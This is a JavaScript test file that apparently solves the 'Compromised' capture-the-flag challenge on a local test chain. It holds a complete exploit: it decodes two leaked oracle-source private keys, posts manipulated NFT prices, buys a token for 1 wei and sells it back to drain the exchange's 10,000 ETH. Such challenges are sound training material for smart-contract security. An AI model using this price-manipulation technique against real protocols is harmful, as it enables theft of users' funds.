const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract, web3 } = require('@openzeppelin/test-environment');

const Exchange = contract.fromArtifact('Exchange');
const DamnValuableNFT = contract.fromArtifact('DamnValuableNFT');
const TrustfulOracle = contract.fromArtifact('TrustfulOracle');
const TrustfulOracleInitializer = contract.fromArtifact('TrustfulOracleInitializer');

const { expect } = require('chai');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const [deployer, attacker] = accounts;
    const EXCHANGE_INITIAL_ETH_BALANCE = ether('10000');
    const INITIAL_NFT_PRICE = ether('999');
    let addedAccountA, addedAccountB

    before(async function () {
        /** SETUP - NO NEED TO CHANGE ANYTHING HERE */

        // Fund the trusted source addresses
        await web3.eth.sendTransaction({ from: deployer, to: sources[0], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[1], value: ether('5') });
        await web3.eth.sendTransaction({ from: deployer, to: sources[2], value: ether('5') });

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracle.at(
            await (await TrustfulOracleInitializer.new(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
                { from: deployer }
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await Exchange.new(
            this.oracle.address,
            { from: deployer, value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.token = await DamnValuableNFT.at(await this.exchange.token());
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        const decodePrivateKey = (src) => {
            return Buffer.from(
                Buffer.from(src, 'hex').toString(),
                'base64'
            );
        }
        const postPriceFromAccount = async (account, price) => {
            let data = web3.eth.abi.encodeFunctionCall({
                name: 'postPrice',
                type: 'function',
                inputs: [{
                    type: 'string',
                    name: 'symbol'
                },{
                    type: 'uint256',
                    name: 'price'
                }]
            }, [ "DVNFT", price.toString() ]);
            let tx = await account.signTransaction({
                to: this.oracle.address,
                gas: 1000000,
                data: data.toString()
            });
            return web3.eth.sendSignedTransaction(tx.rawTransaction);
        }

        let privateKeyA = decodePrivateKey('4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35'.split(' ').join('')).toString();
        let accountA = await web3.eth.accounts.privateKeyToAccount(privateKeyA);
        let privateKeyB = decodePrivateKey('4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'.split(' ').join('')).toString();
        let accountB = await web3.eth.accounts.privateKeyToAccount(privateKeyB);
        addedAccountA = await web3.eth.accounts.wallet.add(accountA);
        addedAccountB = await web3.eth.accounts.wallet.add(accountB);

        await postPriceFromAccount(accountA, 1);
        await postPriceFromAccount(accountB, 1);

        let tx = await this.exchange.buyOne({ from: attacker, value: 1 });
        let tokenId = tx.logs[0].args.tokenId;
        let amount = EXCHANGE_INITIAL_ETH_BALANCE.add(web3.utils.toBN('1'));

        await postPriceFromAccount(accountA, amount);
        await postPriceFromAccount(accountB, amount);

        await this.token.approve(this.exchange.address, tokenId, { from: attacker });
        await this.exchange.sellOne(tokenId, { from: attacker });
    });

    after(async function () {
        // Exchange must have lost all ETH
        expect(
            await balance.current(this.exchange.address)
        ).to.be.bignumber.eq('0');
        expect(
            await balance.current(attacker)
        ).to.be.bignumber.gt(EXCHANGE_INITIAL_ETH_BALANCE);
    });
});
